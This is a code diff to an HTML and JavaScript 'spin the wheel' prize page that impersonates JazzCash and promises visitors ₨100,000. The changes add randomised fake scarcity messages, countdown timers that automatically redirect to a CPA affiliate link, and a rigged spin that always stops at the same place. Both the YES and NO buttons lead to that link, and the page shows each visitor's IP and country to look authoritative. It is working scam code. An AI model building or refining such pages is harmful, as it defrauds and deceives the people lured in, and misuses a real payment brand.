@@ -323,7 +323,6 @@
     }
     #postComment:disabled { opacity: 0.5; cursor: default; }
 
-    /* MODALS */
     .modal-overlay {
       position: fixed;
       inset: 0;
@@ -407,6 +406,60 @@
       50% { transform: translateY(-10px); }
     }
 
+    .emergency-timer {
+      background: #1a0000;
+      border: 2px solid #ff0000;
+      border-radius: 12px;
+      padding: 12px;
+      margin: 15px 0;
+      color: #ff4444;
+      font-weight: 700;
+      font-size: 14px;
+    }
+    .timer-display {
+      font-size: 32px;
+      font-weight: 800;
+      color: #ff0000;
+      letter-spacing: 2px;
+      animation: pulse-red 1s infinite;
+    }
+    @keyframes pulse-red {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.6; }
+    }
+    .timer-label {
+      font-size: 12px;
+      color: #ff6666;
+      margin-top: 4px;
+    }
+    .limited-offer {
+      background: linear-gradient(135deg, #FFD700, #FFA500);
+      color: #000;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-weight: 800;
+      font-size: 12px;
+      display: inline-block;
+      margin: 8px 0;
+      letter-spacing: 1px;
+    }
+
+    .scarcity-note {
+      background: rgba(255,215,0,0.1);
+      border: 1px solid rgba(255,215,0,0.3);
+      border-radius: 10px;
+      padding: 10px;
+      margin: 10px 0;
+      color: #FFD700;
+      font-weight: 700;
+      font-size: 13px;
+      animation: glow-pulse 2s infinite;
+    }
+    @keyframes glow-pulse {
+      0%, 100% { box-shadow: 0 0 5px rgba(255,215,0,0.2); }
+      50% { box-shadow: 0 0 15px rgba(255,215,0,0.5); }
+    }
+
     .btn-primary, .btn-yes, .btn-no, .btn-ok {
       width: 100%;
       padding: 13px;
@@ -487,16 +540,17 @@
     </div>
   </div>
 
-  <!-- INITIAL POPUP (appears on page load) -->
+  <!-- INITIAL POPUP -->
   <div id="initialModal" class="modal-overlay">
     <div class="modal">
-      <h3>📱 Your phone number has been chosen!</h3>
+      <h3>📱 Your phone number has been chosen to receive up to <span style="color:#FFD700;">₨100,000</span></h3>
+      <div class="limited-offer">⚡ LIMITED TIME OFFER</div>
       <div class="modal-info" id="initialInfo">
         <div class="info-row"><span class="info-label">IP Address</span><span class="info-value" id="userIP">Loading...</span></div>
         <div class="info-row"><span class="info-label">Device</span><span class="info-value" id="initialDevice">Detecting...</span></div>
         <div class="info-row"><span class="info-label">Country</span><span class="info-value" id="userCountry">Loading...</span></div>
       </div>
-      <p style="color:#FFD700; font-weight:600;" id="selectedNote">You are 1 among 3 selected today!</p>
+      <div class="scarcity-note" id="scarcityNote1">🔥 You are 1 among only 3 selected today!</div>
       <div class="modal-sponsor">
         <span>Sponsored by</span>
         <span style="font-weight:700; color:#e80000;">JazzCash</span>
@@ -506,14 +560,16 @@
     </div>
   </div>
 
-  <!-- POST-SPIN MODAL (Claim 100,000 PKR) -->
-  <div id="claimModal" class="modal-overlay">
+  <!-- POST-SPIN MODAL -->
+  <div id="winConfirmModal" class="modal-overlay">
     <div class="modal">
-      <h3>🎉 Claim 100,000 PKR</h3>
-      <p>Congratulations! You've won the grand prize. Tap YES to claim now.</p>
+      <h3>🎉 Yeah! You have won <span style="color:#FFD700;">₨100,000</span></h3>
+      <div class="money-img">💰💵💸</div>
+      <p>Confirm your phone number to claim your reward now!</p>
+      <div class="scarcity-note" id="scarcityNote2">🔥 You are 1 among only 3 selected today!</div>
       <div class="actions">
-        <button class="btn-yes" id="yesClaimBtn">YES</button>
-        <button class="btn-no" id="noClaimBtn">NO</button>
+        <button class="btn-yes" id="winYesBtn">YES</button>
+        <button class="btn-no" id="winNoBtn">NO</button>
       </div>
       <div class="modal-sponsor">
         <span>Sponsored by</span>
@@ -523,13 +579,40 @@
     </div>
   </div>
 
-  <!-- SECOND MODAL (for NO path) with money image -->
-  <div id="secondModal" class="modal-overlay">
+  <!-- YES PATH -->
+  <div id="confirmPhoneModal" class="modal-overlay">
     <div class="modal">
-      <h3>⏳ Almost There!</h3>
-      <div class="money-img">💰💵💸</div>
-      <p>Complete the last step to claim your reward securely. Don't miss out on ₨100,000!</p>
-      <button class="btn-ok" id="finalCtaBtn">OK, CONTINUE</button>
+      <h3>📞 Confirm Your Phone Number</h3>
+      <div class="money-img">📱💸💰</div>
+      <p>Tap the button below to confirm your phone number and claim <strong style="color:#FFD700;">₨100,000</strong> instantly!</p>
+      <div class="scarcity-note" id="scarcityNote3">🔥 You are 1 among only 3 selected today!</div>
+      <div class="emergency-timer">
+        <div>⚠️ OFFER EXPIRES IN</div>
+        <div class="timer-display" id="countdownTimer1">00:45</div>
+        <div class="timer-label">Claim before time runs out!</div>
+      </div>
+      <button class="btn-primary" id="confirmPhoneCtaBtn">Confirm Phone Number to Claim</button>
+      <div class="modal-sponsor">
+        <span>Sponsored by</span>
+        <span style="font-weight:700; color:#e80000;">JazzCash</span>
+        <img src="https://banner2.cleanpng.com/lnd/20250110/pw/d0ad8bb55bc068ecf2058516429406.webp" alt="JazzCash" style="height:20px;" onerror="this.style.display='none';">
+      </div>
+    </div>
+  </div>
+
+  <!-- NO PATH -->
+  <div id="lastStepModal" class="modal-overlay">
+    <div class="modal">
+      <h3>⏳ Complete the simple last step to claim your reward</h3>
+      <div class="money-img">🎁💎🏆</div>
+      <p>Don't miss out on <strong style="color:#FFD700;">₨100,000</strong>! Just one click away.</p>
+      <div class="scarcity-note" id="scarcityNote4">🔥 You are 1 among only 3 selected today!</div>
+      <div class="emergency-timer">
+        <div>⚠️ OFFER EXPIRES IN</div>
+        <div class="timer-display" id="countdownTimer2">00:30</div>
+        <div class="timer-label">Tap OK now before it's too late!</div>
+      </div>
+      <button class="btn-ok" id="lastStepOkBtn">OK</button>
     </div>
   </div>
 
@@ -541,8 +624,9 @@
       const spinBtn = document.getElementById('spinBtn');
       const centerIcon = document.getElementById('centerSpin');
       const initialModal = document.getElementById('initialModal');
-      const claimModal = document.getElementById('claimModal');
-      const secondModal = document.getElementById('secondModal');
+      const winConfirmModal = document.getElementById('winConfirmModal');
+      const confirmPhoneModal = document.getElementById('confirmPhoneModal');
+      const lastStepModal = document.getElementById('lastStepModal');
       const commentsList = document.getElementById('comments-list');
       const confettiCanvas = document.getElementById('confetti-canvas');
       const confettiCtx = confettiCanvas.getContext('2d');
@@ -551,15 +635,20 @@
       let currentRotation = 0;
       let userCountryName = 'Pakistan';
       let userCountryFlag = '🇵🇰';
-      let userIP = '192.168.1.1';
+      let userIP = 'Loading...';
+      let countdownInterval1 = null;
+      let countdownInterval2 = null;
+      let countdownSeconds1 = 45;
+      let countdownSeconds2 = 30;
+      let selectedCount = 3; // Store the scarcity number
 
       const WHEEL_SEGMENTS = [
-        { label: "₨100,000", color: "#151515", accent: "#FFD700", icon: "💰" },
-        { label: "X",       color: "#222222", accent: "#666", icon: "❌" },
-        { label: "₨70,000", color: "#151515", accent: "#25D366", icon: "💵" },
-        { label: "X",       color: "#222222", accent: "#666", icon: "❌" },
-        { label: "₨50,000", color: "#151515", accent: "#E63946", icon: "💸" },
-        { label: "X",       color: "#222222", accent: "#666", icon: "❌" }
+        { label: "₨100,000", color: "#151515", accent: "#FFD700", icon: "💰", amount: "₨100,000" },
+        { label: "X",       color: "#222222", accent: "#666", icon: "❌", amount: "X" },
+        { label: "₨70,000", color: "#151515", accent: "#25D366", icon: "💵", amount: "₨70,000" },
+        { label: "X",       color: "#222222", accent: "#666", icon: "❌", amount: "X" },
+        { label: "₨50,000", color: "#151515", accent: "#E63946", icon: "💸", amount: "₨50,000" },
+        { label: "X",       color: "#222222", accent: "#666", icon: "❌", amount: "X" }
       ];
 
       const STATIC_COMMENTS = [
@@ -582,7 +671,6 @@
           const ipRes = await fetch('https://api.ipify.org?format=json');
           const ipData = await ipRes.json();
           userIP = ipData.ip;
-
           const geoRes = await fetch(`https://ipapi.co/${userIP}/json/`);
           const geoData = await geoRes.json();
           if (geoData.country_name) {
@@ -592,19 +680,38 @@
         } catch (e) {
           userCountryName = 'Pakistan';
           userCountryFlag = '🇵🇰';
-          userIP = '103.255.4.xx';
+          userIP = 'Unable to detect';
         }
         document.getElementById('userIP').textContent = userIP;
-        document.getElementById('initialDevice').textContent = detectDevice();
+        document.getElementById('initialDevice').textContent = detectDeviceType();
         document.getElementById('userCountry').textContent = userCountryFlag + ' ' + userCountryName;
-        document.getElementById('selectedNote').textContent = `You are 1 among ${Math.floor(Math.random() * 4) + 2} selected today!`;
+        selectedCount = Math.floor(Math.random() * 2) + 2; // 2 or 3
+        updateAllScarcityNotes();
         initialModal.style.display = 'flex';
+      }
+
+      function updateAllScarcityNotes() {
+        const noteText = `🔥 You are 1 among only ${selectedCount} selected today!`;
+        const notes = document.querySelectorAll('.scarcity-note');
+        notes.forEach(note => {
+          note.textContent = noteText;
+        });
       }
 
       function getFlagEmoji(countryCode) {
         if (!countryCode) return '🇵🇰';
         const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
         return String.fromCodePoint(...codePoints);
+      }
+
+      function detectDeviceType() {
+        const ua = navigator.userAgent;
+        if (/iPad|iPhone|iPod/.test(ua)) return 'iOS Mobile';
+        if (/Android/.test(ua)) return 'Android Mobile';
+        if (/Macintosh|Mac OS X/.test(ua)) return 'macOS Desktop';
+        if (/Windows/.test(ua)) return 'Windows Desktop';
+        if (/Linux/.test(ua) && !/Android/.test(ua)) return 'Linux Desktop';
+        return 'Unknown Device';
       }
 
       function createParticles() {
@@ -716,6 +823,52 @@
         animateConfetti();
       }
 
+      function startCountdown1() {
+        countdownSeconds1 = 45;
+        const timerDisplay = document.getElementById('countdownTimer1');
+        function updateTimer() {
+          const minutes = Math.floor(countdownSeconds1 / 60);
+          const seconds = countdownSeconds1 % 60;
+          timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+          if (countdownSeconds1 <= 10) timerDisplay.style.color = '#ff0000';
+          if (countdownSeconds1 <= 0) {
+            clearInterval(countdownInterval1);
+            timerDisplay.textContent = "00:00";
+            window.location.href = CPA_LINK;
+          }
+          countdownSeconds1--;
+        }
+        updateTimer();
+        countdownInterval1 = setInterval(updateTimer, 1000);
+      }
+
+      function stopCountdown1() {
+        if (countdownInterval1) { clearInterval(countdownInterval1); countdownInterval1 = null; }
+      }
+
+      function startCountdown2() {
+        countdownSeconds2 = 30;
+        const timerDisplay = document.getElementById('countdownTimer2');
+        function updateTimer() {
+          const minutes = Math.floor(countdownSeconds2 / 60);
+          const seconds = countdownSeconds2 % 60;
+          timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+          if (countdownSeconds2 <= 10) timerDisplay.style.color = '#ff0000';
+          if (countdownSeconds2 <= 0) {
+            clearInterval(countdownInterval2);
+            timerDisplay.textContent = "00:00";
+            window.location.href = CPA_LINK;
+          }
+          countdownSeconds2--;
+        }
+        updateTimer();
+        countdownInterval2 = setInterval(updateTimer, 1000);
+      }
+
+      function stopCountdown2() {
+        if (countdownInterval2) { clearInterval(countdownInterval2); countdownInterval2 = null; }
+      }
+
       function startSpin() {
         if(isSpinning) return;
         isSpinning = true;
@@ -723,14 +876,18 @@
         centerIcon.style.pointerEvents = 'none';
         spinBtn.textContent = "SPINNING...";
 
-        const spins = 5 + Math.floor(Math.random() * 2);
-        const randomOffset = (Math.random() * 20) - 10;
-        const targetRotation = (spins * 360) + randomOffset;
-        canvas.style.transform = `rotate(${currentRotation + targetRotation}deg)`;
-        currentRotation += targetRotation;
+        const fullSpins = 5;
+        const baseOffset = 60;
+        const totalSpinDegrees = (fullSpins * 360) + baseOffset;
+        const tinyJitter = (Math.random() * 4) - 2;
+        const finalRotation = totalSpinDegrees + tinyJitter;
+
+        canvas.style.transform = `rotate(${currentRotation + finalRotation}deg)`;
+        currentRotation += finalRotation;
 
         setTimeout(() => {
-          claimModal.style.display = 'flex';
+          updateAllScarcityNotes(); // Refresh scarcity on all popups
+          winConfirmModal.style.display = 'flex';
           startConfetti();
           spinBtn.disabled = false;
           centerIcon.style.pointerEvents = 'auto';
@@ -746,27 +903,29 @@
         initialModal.style.display = 'none';
       });
 
-      document.getElementById('yesClaimBtn').addEventListener('click', () => {
+      document.getElementById('winYesBtn').addEventListener('click', () => {
+        updateAllScarcityNotes();
+        winConfirmModal.style.display = 'none';
+        confirmPhoneModal.style.display = 'flex';
+        startCountdown1();
+      });
+
+      document.getElementById('winNoBtn').addEventListener('click', () => {
+        updateAllScarcityNotes();
+        winConfirmModal.style.display = 'none';
+        lastStepModal.style.display = 'flex';
+        startCountdown2();
+      });
+
+      document.getElementById('confirmPhoneCtaBtn').addEventListener('click', () => {
+        stopCountdown1();
         window.location.href = CPA_LINK;
       });
 
-      document.getElementById('noClaimBtn').addEventListener('click', () => {
-        claimModal.style.display = 'none';
-        secondModal.style.display = 'flex';
-      });
-
-      document.getElementById('finalCtaBtn').addEventListener('click', () => {
+      document.getElementById('lastStepOkBtn').addEventListener('click', () => {
+        stopCountdown2();
         window.location.href = CPA_LINK;
       });
-
-      function detectDevice() {
-        const ua = navigator.userAgent;
-        if (/iPad|iPhone|iPod/.test(ua)) return 'Apple iPhone 16 Pro';
-        if (/Android/.test(ua)) return 'Samsung Galaxy S24 Ultra';
-        if (/Macintosh/.test(ua)) return 'MacBook Pro M3';
-        if (/Windows/.test(ua)) return 'Windows 11 PC';
-        return 'Premium Device';
-      }
 
       let likes = 1205;
       let views = 300450;
